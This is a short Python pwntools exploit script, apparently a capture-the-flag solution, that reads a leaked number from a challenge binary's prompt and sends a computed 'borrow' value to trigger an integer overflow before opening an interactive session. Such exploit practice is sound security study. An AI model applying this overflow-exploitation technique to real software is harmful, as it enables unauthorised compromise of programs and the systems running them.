#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *vuln+445
        b *vuln+331
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    int_max = 2147483647
    int_min = -2147483648
    abs_min = 2147483648

    p.recvuntil(b"Return ")
    leak = int(p.recvuntil(b"more").split(b"m")[0],10)
    p.recvuntil(b"borrow >>>")

    borrow = int_max + 1 + (leak - abs_min) * -1
    print(borrow)
    p.sendline(bytes(str(borrow), "utf-8"))
    p.recvuntil(b"return >>>")
    p.sendline(b"0")
    p.interactive()




if __name__=="__main__":
    file = './chal.bin'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
